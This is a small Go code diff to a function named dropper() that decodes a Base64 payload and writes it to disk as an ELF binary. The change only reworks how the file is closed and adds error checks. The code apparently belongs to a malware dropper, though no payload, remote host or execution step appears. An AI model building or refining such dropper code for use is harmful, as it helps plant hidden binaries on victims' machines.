@@ -57,7 +57,6 @@ func dropper() error {
 	if err != nil {
 		return err
 	}
-	defer file.Close()
 
 	// Decode Base64 payload
 	decoded_payload, err := base64.StdEncoding.DecodeString(payload)
@@ -80,6 +79,11 @@ func dropper() error {
 
 	// Write ELF binary to disk
 	_, err = file.Write(binary)
+	if err != nil {
+		return err
+	}
+
+	err = file.Close()
 	if err != nil {
 		return err
 	}
